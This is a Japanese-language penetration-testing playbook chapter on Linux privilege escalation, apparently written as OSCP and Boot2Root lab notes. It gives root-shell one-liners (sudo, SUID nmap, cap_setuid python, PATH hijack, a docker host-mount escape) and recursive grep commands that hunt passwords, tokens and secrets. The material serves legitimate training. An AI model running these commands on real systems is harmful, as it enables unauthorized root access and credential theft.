# Privilege Escalation（権限昇格）

Privilege Escalation は、Local Enumeration で収集した情報をもとに  
**権限を root / SYSTEM に引き上げるフェーズ**です。

Boot2Root テンプレートの **PrivEsc 章の詳細版**として機能します。

---

# 🎯 目的

- 権限昇格の突破口を特定する  
- SUID / Capability / Cron / Sudo / Kernel Exploit を検証する  
- 認証情報を利用した横展開を行う  
- OSCP レポートで必要な「再現性のある PrivEsc 手順」を整理する  

---

# 📘 目次

1. Sudo 権限昇格  
2. SUID 権限昇格  
3. Capability 権限昇格  
4. Cron / Timer 権限昇格  
5. パスワード・鍵による権限昇格  
6. Kernel Exploit  
7. Misconfigurations（設定ミス）  
8. Docker / LXC / コンテナ脱出  
9. Windows PrivEsc（補足）  
10. Boot2Root との連携

---

# 1. Sudo 権限昇格

```
sudo -l
```

### 確認ポイント
- パスワード不要の sudo  
- 特定コマンドの sudo 実行  
- sudo 経由でシェルを取得できるか  

### 例：sudo 経由で bash
```
sudo /bin/bash
```

### 例：sudo 経由で python
```
sudo python3 -c 'import os; os.system("/bin/bash")'
```

---

# 2. SUID 権限昇格

```
find / -perm -4000 -type f 2>/dev/null
```

### よくある SUID バイナリ
- nmap  
- vim  
- python  
- find  
- bash  
- cp / mv（ファイル書き換え）  

### 例：SUID nmap
```
nmap --interactive
!sh
```

---

# 3. Capability 権限昇格

```
getcap -r / 2>/dev/null
```

### よくある危険な Capability
- cap_setuid  
- cap_setgid  
- cap_dac_read_search  

### 例：python に cap_setuid がある場合
```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# 4. Cron / Timer 権限昇格

```
crontab -l
ls -la /etc/cron*
systemctl list-timers
```

### 確認ポイント
- 書き込み可能なスクリプト  
- root 実行の cron  
- PATH の悪用  

### 例：cron が `/usr/local/bin/backup.sh` を root で実行
→ backup.sh を書き換えて root シェル取得

---

# 5. パスワード・鍵による権限昇格

### 探索対象
```
grep -Ri "password" /
grep -Ri "pass" /
grep -Ri "token" /
grep -Ri "secret" /
```

### よくある突破口
- DB 認証情報 → OS ユーザーと同じ  
- SSH 鍵 → root の authorized_keys  
- Web アプリの設定ファイル → OS パスワード再利用  

---

# 6. Kernel Exploit

```
uname -a
cat /etc/os-release
```

### 代表的な Kernel Exploit
- DirtyCow  
- DirtyPipe  
- OverlayFS  
- PwnKit（pkexec）  

### 注意
OSCP では Kernel Exploit は最終手段。  
再現性が低いため、他の PrivEsc を優先する。

---

# 7. Misconfigurations（設定ミス）

### よくある設定ミス
- 書き込み可能な root 実行スクリプト  
- root 所有のファイルにユーザーが書き込み可能  
- PATH の悪用  
- 環境変数の悪用  

### 例：PATH の悪用
```
echo "/bin/bash" > /tmp/ls
export PATH=/tmp:$PATH
```

---

# 8. Docker / LXC / コンテナ脱出

```
cat /proc/1/cgroup
docker ps
```

### よくある突破口
- docker グループに所属している  
- docker run が可能  
- コンテナ内からホストの root を取得  

### 例：docker グループに所属している場合
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

# 9. Windows PrivEsc（補足）

※ Boot2Root は Linux が中心だが、Windows の補足も記載。

### よくある突破口
- Unquoted Service Path  
- Weak Service Permissions  
- AlwaysInstallElevated  
- Registry 権限ミス  
- Token Impersonation（JuicyPotato / RoguePotato）  

---

# 10. Boot2Root との連携

Boot2Root の PrivEsc 章は軽量化されており、  
詳細はこのページにリンクされます。

Boot2Root の流れ：

```
Local Enumeration
↓
Privilege Escalation
↓
Credential Access / Internal Enumeration
```

そのため、Boot2Root では結果だけ記録し、  
技術的な深掘りは Pentest-Playbook の PrivEsc に集約します。

---

# 🎯 この章の目的

- PrivEsc の技術体系を 1ページに集約  
- Boot2Root の軽量テンプレートと連携  
- OSCP レポート品質の情報整理  
- 将来の構造変更にも強い設計  
